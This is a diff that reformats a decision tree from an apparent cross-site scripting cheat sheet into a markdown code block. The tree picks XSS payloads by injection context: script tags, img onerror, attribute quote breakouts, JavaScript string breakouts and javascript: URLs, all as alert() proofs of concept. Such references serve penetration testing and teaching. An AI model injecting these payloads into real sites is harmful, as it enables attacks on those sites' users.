@@ -332,36 +332,35 @@ data:text/html,<script>alert('XSS')</script>
 
 ---
 
-PAYLOAD SELECTION DECISION TREE
-================================
+## PAYLOAD SELECTION DECISION TREE
 
+```
 Is input in HTML body?
- ├─ YES
- │  ├─ <script> tag filtered?
- │  │  ├─ YES → Try `<img src=x onerror="alert()">`
- │  │  └─ NO → Try <script>alert('XSS')</script>
- │  └─ Quote marks in output?
- │     └─ Check for encoding
- │
- ├─ Is input in HTML attribute?
- │   ├─ YES
- │   │  ├─ Uses double quotes?
- │   │  │  └─ Use: " onmouseover="alert('XSS')" x="
- │   │  └─ Uses single quotes?
- │   │     └─ Use: ' onclick='alert("XSS")' x='
- │
- ├─ Is input in JavaScript?
- │   ├─ YES
- │   │  ├─ Inside string?
- │   │  │  ├─ Double quotes → Use: "; alert('XSS'); //
- │   │  │  └─ Single quotes → Use: '; alert('XSS'); //
- │   │  └─ Direct execution?
- │   │     └─ Use: alert('XSS')
- │
- └─ Is input in URL?
+├─ YES
+│  ├─ <script> tag filtered?
+│  │  ├─ YES → Try <img src=x onerror="alert()">
+│  │  └─ NO → Try <script>alert('XSS')</script>
+│  └─ Quote marks in output?
+│     └─ Check for encoding
+│
+├─ Is input in HTML attribute?
+│  ├─ YES
+│  │  ├─ Uses double quotes?
+│  │  │  └─ Use: " onmouseover="alert('XSS')" x="
+│  │  └─ Uses single quotes?
+│  │     └─ Use: ' onclick='alert("XSS")' x='
+│
+├─ Is input in JavaScript?
+│  ├─ YES
+│  │  ├─ Inside string?
+│  │  │  ├─ Double quotes → Use: "; alert('XSS'); //
+│  │  │  └─ Single quotes → Use: '; alert('XSS'); //
+│  │  └─ Direct execution?
+│  │     └─ Use: alert('XSS')
+│
+└─ Is input in URL?
    └─ Use: javascript:alert('XSS')
-
----
+```
 
 ## ENCODING REFERENCE
 
